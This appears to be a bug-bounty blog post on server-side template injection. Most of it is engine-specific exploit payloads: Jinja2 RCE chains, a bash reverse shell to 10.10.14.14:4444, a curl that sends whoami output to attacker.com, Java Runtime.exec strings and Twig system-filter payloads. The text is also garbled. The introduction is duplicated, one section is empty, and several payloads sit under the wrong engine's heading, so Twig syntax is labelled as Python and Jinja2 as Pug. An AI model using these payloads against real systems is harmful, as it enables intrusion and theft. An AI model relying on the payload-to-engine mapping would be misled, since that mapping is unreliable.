# From {{7*7}} to Domain Admin: Server-Side Template Injection in 2025

> “One curly brace can give you a shell. Two curly braces can give you the whole kingdom.”

## 1. What is SSTI and Why It’s Still #1 RCE Vector in 2025

Server-Side Template Injection occurs when user input is unsafely embedded into a template engine (Jinja2, Twig, Freemarker, Velocity, Handlebars, Pug, etc.) and then evaluated as code.

While XSS is blocked by CSP and SQLi is killed by prepared statements, SSTI remains one of the most powerful and under-defended vulnerabilities in modern applications – especially in Python/Flask, Node.js/Express, Java/Spring and PHP/Laravel ecosystems.

Real-world impact in 2024–2025:
- $55,000 bounty – Spring Boot + Thymeleaf SSTI → RCE (private program)
- $40,000 bounty – Flask/Jinja2 → Remote Code Execution (U.S. DoD program)
- $32,000 bounty – Node.js + Pug template → Container Escape

## 2. Detection Techniques (2025 Updated Payloads)

### Classic polyglots (still work everywhere)# SSTİ-


# From {{7*7}} to Domain Admin: Server-Side Template Injection in 2025

> “One curly brace can give you a shell. Two curly braces can give you the whole kingdom.”

## 1. What is SSTI and Why It’s Still #1 RCE Vector in 2025

Server-Side Template Injection occurs when user input is unsafely embedded into a template engine (Jinja2, Twig, Freemarker, Velocity, Handlebars, Pug, etc.) and then evaluated as code.

While XSS is blocked by CSP and SQLi is killed by prepared statements, SSTI remains one of the most powerful and under-defended vulnerabilities in modern applications – especially in Python/Flask, Node.js/Express, Java/Spring and PHP/Laravel ecosystems.

Real-world impact in 2024–2025:
- $55,000 bounty – Spring Boot + Thymeleaf SSTI → RCE (private program)
- $40,000 bounty – Flask/Jinja2 → Remote Code Execution (U.S. DoD program)
- $32,000 bounty – Node.js + Pug template → Container Escape

## 2. Detection Techniques (2025 Updated Payloads)

### Classic polyglots (still work everywhere)

## 3. Exploitation – Engine-Specific Chains (2025 Working)

### Python / Flask / Jinja2 (most common)
```python
# Step 1 – Find subclass index (changes in every Python version)
{{''.__class__.__mro__[1].__subclasses__().index(<class 'warnings.catch_warnings'>)}}

# Step 2 – Classic one-liner RCE (Python 3.8–3.12)
{{''.__class__.__mro__[1].__subclasses__()[414](__init__.__globals__['sys'].modules['os'].popen('whoami').read())}}

# Step 3 – 2025 most stable chain (works on 3.9–3.13)
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("curl http://attacker.com/$(whoami)")}}
Node.js / Express / Pug
# Step 4 – Reverse shell (one-liner)
{{request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.14/4444 0>&1"').read()}}




Java / Spring Boot / Thymeleaf + Freemarker${T(java.lang.Runtime).getRuntime().exec("calc.exe")}
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105)).getInputStream())}



PHP / Twig / Symfony / Laravel Blade
{{_self.env.setCache("ftp://attacker:80")}}{{_self.env.loadTemplate("backdoor")}}
{{['id']|filter('system')}}
{{app.request.server.all|join(',')}}
